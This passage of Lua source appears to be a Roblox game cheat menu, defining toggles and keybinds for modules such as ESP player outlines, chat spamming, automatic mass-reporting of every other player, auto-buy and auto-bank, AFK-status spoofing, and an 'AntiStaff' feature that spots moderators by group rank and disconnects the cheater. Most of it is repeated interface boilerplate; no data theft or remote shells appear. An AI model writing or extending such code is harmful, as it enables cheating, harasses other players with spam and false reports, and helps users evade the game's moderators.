						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Fly.Value == false then
						FlyValue = false
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local DamageBoost, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "DamageBoost", Settings.DamageBoost.Value, function(CallBack)
		Settings.DamageBoost.Value = CallBack

		task.spawn(function()	
			Client:WaitFor("EntityDamageEvent"):andThen(function(v)
				v:Connect(function(Player) 
					if Settings.DamageBoost.Value == true and IsAlive(LocalPlayer) and Player.entityInstance == LocalPlayer.Character and GetMatchState() ~= 0 then 
						task.spawn(function()
							DamageBoost = true

							task.wait(0.78)

							DamageBoost = false	
						end) 
					end 
				end)    
			end)
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.DamageBoost.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.DamageBoost.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.DamageBoost.KeyBind then
					Settings.DamageBoost.Value = not Settings.DamageBoost.Value

					if Settings.DamageBoost.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.DamageBoost.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local ChatSpammer, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "ChatSpammer", Settings.ChatSpammer.Value, function(CallBack)
		Settings.ChatSpammer.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(100 / Settings.ChatSpammer.Speed)

				task.spawn(function()
					if GetMatchState() ~= 0 and Settings.ChatSpammer.Value == true then
						ChatSpam()
					end
				end)
			until Settings.ChatSpammer.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.ChatSpammer.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.ChatSpammer.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.ChatSpammer.KeyBind then
					Settings.ChatSpammer.Value = not Settings.ChatSpammer.Value

					if Settings.ChatSpammer.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.ChatSpammer.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Speed", Settings.ChatSpammer.Speed, 100, LayoutOrder + 2, function(CallBack)
					Settings.ChatSpammer.Speed = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AutoReport, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoReport", Settings.AutoReport.Value, function(CallBack)
		Settings.AutoReport.Value = CallBack

		task.spawn(function()
			local ReportedList = {}

			repeat
				task.wait(1)

				task.spawn(function()
					for i, v in next, PlayerService:GetPlayers() do
						if Settings.AutoReport.Value == true then
							if v ~= LocalPlayer and v:GetAttribute("PlayerConnected") and ReportedList[v] == nil then
								ReportRemote:FireServer(v.UserId)
								ReportedList[v] = true
							end
						end
					end	
				end)		
			until Settings.AutoReport.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoReport.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoReport.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoReport.KeyBind then
					Settings.AutoReport.Value = not Settings.AutoReport.Value

					if Settings.AutoReport.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoReport.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local FpsBooster, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "FpsBooster", Settings.FpsBooster.Value, function(CallBack)
		Settings.FpsBooster.Value = CallBack

		task.spawn(function()
			if Settings.FpsBooster.Value == true then
				FpsBoost()
			end
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.FpsBooster.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.FpsBooster.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.FpsBooster.KeyBind then
					Settings.FpsBooster.Value = not Settings.FpsBooster.Value

					if Settings.FpsBooster.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.FpsBooster.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local PlayAgain, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "PlayAgain", Settings.PlayAgain.Value, function(CallBack)
		Settings.PlayAgain.Value = CallBack

		task.spawn(function()
			if GetQueueType():find("Skywars") then
				repeat task.wait(3) until not IsAlive(LocalPlayer)

				if Settings.PlayAgain.Value == true then
					PlayAgainRemote:FireServer({["queueType"] = GetQueueType()})
				end			
			end
		end)

		task.spawn(function()
			repeat task.wait(3) until GetMatchState() == 2

			if Settings.PlayAgain.Value == true then
				PlayAgainRemote:FireServer({["queueType"] = GetQueueType()})
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.PlayAgain.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.PlayAgain.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.PlayAgain.KeyBind then
					Settings.PlayAgain.Value = not Settings.PlayAgain.Value

					if Settings.PlayAgain.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.PlayAgain.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoToxic, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoToxic", Settings.AutoToxic.Value, function(CallBack)
		Settings.AutoToxic.Value = CallBack
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoToxic.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoToxic.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoToxic.KeyBind then
					Settings.AutoToxic.Value = not Settings.AutoToxic.Value

					if Settings.AutoToxic.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoToxic.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoBank, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoBank", Settings.AutoBank.Value, function(CallBack)
		Settings.AutoBank.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					AutoBank()
				end
			until Settings.AutoBank.Value == false or GetQueueType():find("Skywars")
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoBank.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoBank.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoBank.KeyBind then
					Settings.AutoBank.Value = not Settings.AutoBank.Value

					if Settings.AutoBank.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoBank.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Range", Settings.AutoBank.Range, 30, LayoutOrder + 2, function(CallBack)
					Settings.AutoBank.Range = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AntiStaff, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AntiStaff", Settings.AntiStaff.Value, function(CallBack)
		Settings.AntiStaff.Value = CallBack

		task.spawn(function()
			task.spawn(function()
				PlayerService.PlayerAdded:Connect(function(Player)
					if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then

						task.spawn(function()
							if Settings.AntiStaff.Kick == true then
								LocalPlayer:Kick("A staff has joined your game, their name is " .. Player.Name .. "!")
							end	
						end)

						task.spawn(function()
							if Settings.AntiStaff.Value == true then
								CreateNotification(60,  "A staff has joined your game, their name is " .. Player.Name .. "!")
							end
						end)
					end
				end)
			end)

			task.spawn(function()
				task.wait(5)

				for i, v in next, PlayerService:GetPlayers() do
					task.spawn(function()
						if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
							task.spawn(function()
								if Settings.AntiStaff.Kick == true then
									LocalPlayer:Kick("A staff has joined your game, their name is " .. v.Name .. "!")
								end	
							end)

							task.spawn(function()
								if Settings.AntiStaff.Value == true then
									CreateNotification(60,  "A staff has joined your game, their name is " .. v.Name .. "!")
								end
							end)									
						end
					end)
				end
			end)
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AntiStaff.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AntiStaff.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AntiStaff.KeyBind then
					Settings.AntiStaff.Value = not Settings.AntiStaff.Value

					if Settings.AntiStaff.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AntiStaff.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(UtilityTab, "Kick", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
					Settings.AntiStaff.Kick = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local AutoBuy, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoBuy", Settings.AutoBuy.Value, function(CallBack)
		Settings.AutoBuy.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(0.1)

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					AutoBuy()
				end
			until Settings.AutoBuy.Value == false or GetQueueType():find("Skywars")
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoBuy.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoBuy.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoBuy.KeyBind then
					Settings.AutoBuy.Value = not Settings.AutoBuy.Value

					if Settings.AutoBuy.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoBuy.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)


task.spawn(function()
	local AntiAfk, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AntiAfk", Settings.AntiAfk.Value, function(CallBack)
		Settings.AntiAfk.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(30)

				local Args = {
					[1] = {
						["afk"] = false
					}
				}

				AfkInfoRemote:FireServer(Args)
			until Settings.AntiAfk.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AntiAfk.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AntiAfk.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AntiAfk.KeyBind then
					Settings.AntiAfk.Value = not Settings.AntiAfk.Value

					if Settings.AntiAfk.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AntiAfk.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AutoKit, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoKit", Settings.AutoKit.Value, function(CallBack)
		Settings.AutoKit.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					AutoKit()
				end
			until Settings.AutoKit.Value == false
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoKit.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AutoKit.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AutoKit.KeyBind then
					Settings.AutoKit.Value = not Settings.AutoKit.Value

					if Settings.AutoKit.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AutoKit.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Fov, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Fov", Settings.Fov.Value, function(CallBack)
		Settings.Fov.Value = CallBack

		task.spawn(function()
			repeat
				task.wait()

				if Settings.Fov.Value == true and KnitClientGotten == true then
					FovController:setFOV(Settings.Fov.Fov)
				end
			until Settings.Fov.Value == false
		end)

		if KnitClientGotten == true and ClientHandlerStoreGotten == true then
			FovController:setFOV(ClientHandlerStore:getState().Settings.fov)
		end
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.Fov.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Fov.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Fov.KeyBind then
					Settings.Fov.Value = not Settings.Fov.Value

					if Settings.Fov.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Fov.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(UtilityTab, "Fov", Settings.Fov.Fov, 120, LayoutOrder + 2, function(CallBack)
					Settings.Fov.Fov = CallBack

					if Settings.Fov.Value == true and KnitClientGotten == true then
						FovController:setFOV(Settings.Fov.Fov)
					end
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local Esp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Esp", Settings.Esp.Value, function(CallBack)
		Settings.Esp.Value = CallBack

		task.spawn(function()
			repeat task.wait() until GetMatchState() ~= 0
			
			if Settings.Esp.Value == true then
				task.spawn(function()
					for i, v in next, PlayerService:GetPlayers() do
						if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
							CreateOutline(v)
						end

						v.CharacterAdded:Connect(function(Character)
							repeat task.wait() until IsAlive(PlayerService:FindFirstChild(Character.Name))


							if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
								CreateOutline(v)
							end
						end)
					end
				end)

				task.spawn(function()
					PlayerService.PlayerAdded:Connect(function(Player)
						Player.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(Player)

							if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
								CreateOutline(Player)
							end
						end)
					end)
				end)
			end
		end)

		task.spawn(function()
			repeat task.wait() until GetMatchState() ~= 0
			
			if Settings.Esp.Value == false then
				for i, v in next, PlayerService:GetPlayers() do
					if IsAlive(v) and v.Character.PrimaryPart:FindFirstChild("Esp") then
						v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
					end
				end
			end
		end)		
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(UtilityTab, Settings.Esp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Esp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Esp.KeyBind then
					Settings.Esp.Value = not Settings.Esp.Value

					if Settings.Esp.Value == true then
						task.spawn(function()
							for i, v in next, PlayerService:GetPlayers() do
								if IsAlive(v) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
									CreateOutline(v)
								end

								v.CharacterAdded:Connect(function(Character)
									repeat task.wait() until IsAlive(PlayerService:FindFirstChild(Character.Name))

									if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
										CreateOutline(v)
									end
								end)
							end
						end)

						task.spawn(function()
							PlayerService.PlayerAdded:Connect(function(Player)
								Player.CharacterAdded:Connect(function()
									repeat task.wait() until Player

									if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer and not Player.Character.PrimaryPart:FindFirstChild("Esp") then
										CreateOutline(Player)
									end
								end)
							end)
						end)

						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					task.spawn(function()
						if Settings.Esp.Value == false then
							for i, v in next, PlayerService:GetPlayers() do
								if IsAlive(v) and v.Character.PrimaryPart:FindFirstChild("Esp") then
									v.Character.PrimaryPart:FindFirstChild("Esp"):Destroy()
								end
							end

							UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
						end
					end)
				end
			end
		end)
	end)
end)

task.spawn(function()
	local CustomInventory, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "CustomHotbar", Settings.CustomInventory.Value, function(CallBack)
		Settings.CustomInventory.Value = CallBack

		task.spawn(function()
			task.spawn(function()
				for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do					
					task.spawn(function()
						if v:IsA("ImageButton") then
							task.spawn(function()
								v:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
									task.wait()

									if Settings.CustomInventory.Value == true then								
										v.BackgroundTransparency = 0.2
									end

									if Settings.CustomInventory.Value == false then								
										v.BackgroundTransparency = 0.4
										v.BackgroundColor3 = Color3.new(0.113725, 0.141176, 0.180392)
									end								
								end)
							end)
						end
					end)

					task.spawn(function()
						if v:IsA("TextLabel") then
							task.spawn(function()
								v:GetPropertyChangedSignal("TextColor3"):Connect(function()
									task.wait()

									if Settings.CustomInventory.Value == true then								
										v.TextColor3 = Color3.new(1, 1, 1)
									end
								end)
							end)
						end
					end)
				end
			end)

			LocalPlayer.CharacterAdded:Connect(function()
				repeat task.wait() until IsAlive(LocalPlayer)

				task.spawn(function()
					for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do					
						task.spawn(function()
							if v:IsA("ImageButton") then
								task.spawn(function()
									v:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
										task.wait()

										if Settings.CustomInventory.Value == false then								
											v.BackgroundTransparency = 0.4
											v.BackgroundColor3 = Color3.new(0.113725, 0.141176, 0.180392)
										end

										if Settings.CustomInventory.Value == true then								
											v.BackgroundTransparency = 0.2
										end
									end)
								end)
							end
						end)

						task.spawn(function()
							if v:IsA("TextLabel") then
								task.spawn(function()
									v:GetPropertyChangedSignal("TextColor3"):Connect(function()
										task.wait()

										if Settings.CustomInventory.Value == true then								
											v.TextColor3 = Color3.new(1, 1, 1)
										end
									end)
								end)
							end
						end)
					end
				end)

				task.spawn(function()
					if Settings.CustomInventory.Value == true then
						for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
							task.spawn(function()
								if v:IsA("UICorner") then
									v.CornerRadius= UDim.new(0, 6)
								end
							end)

							task.spawn(function()
								if v:IsA("ImageButton") then
									v.BackgroundTransparency = 0.2
									v.BackgroundColor3 = Color3.new(0.635294, 0.313725, 1)

									local UICorner = Instance.new("UICorner")

									UICorner.Parent = v
									UICorner.CornerRadius= UDim.new(0, 10)
								end
							end)

							task.spawn(function()
								if v:IsA("TextLabel") then
									v.BackgroundTransparency = 1
									v.TextColor3 = Color3.new(1, 1, 1)	
									v.Position = v.Position + UDim2.new(0, 2, 0, 2)
									v.Font = Enum.Font.GothamBold									
								end
							end)
						end					
					end
				end)			
			end)
		end)

		task.spawn(function()
			if Settings.CustomInventory.Value == true then
				for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do	
					task.spawn(function()
						if v:IsA("UICorner") then
							v.CornerRadius= UDim.new(0, 8)
						end
					end)

					task.spawn(function()
						if v:IsA("ImageButton") then							
							v.BackgroundTransparency = 0.2
							v.BackgroundColor3 = Color3.new(0.635294, 0.313725, 1)

							local UICorner = Instance.new("UICorner")

							UICorner.Parent = v
							UICorner.CornerRadius= UDim.new(0, 10)
						end
					end)

					task.spawn(function()
						if v:IsA("TextLabel") then
							v.BackgroundTransparency = 1
							v.TextColor3 = Color3.new(1, 1, 1)	
							v.Position = v.Position + UDim2.new(0, 2, 0, 2)
							v.Font = Enum.Font.GothamBold	
						end
					end)
				end
			end
		end)		

		task.spawn(function()
			if Settings.CustomInventory.Value == false then
				for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("ItemsHotbar"):GetDescendants() do					
					task.spawn(function()
						if v:IsA("UICorner") then
							v:Destroy()
						end
					end)

					task.spawn(function()
						if v:IsA("ImageButton") then
							v.BackgroundTransparency = 0.4
							v.BackgroundColor3 = Color3.new(0.113725, 0.141176, 0.180392)
						end
					end)

					task.spawn(function()
						if v:IsA("TextLabel") then
							v.BackgroundTransparency = 0	
							v.Position = v.Position - UDim2.new(0, 2, 0, 2)
							v.Font = Enum.Font.GothamBold	
						end
					end)
				end
			end
		end)			
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.CustomInventory.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.CustomInventory.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.CustomInventory.KeyBind then
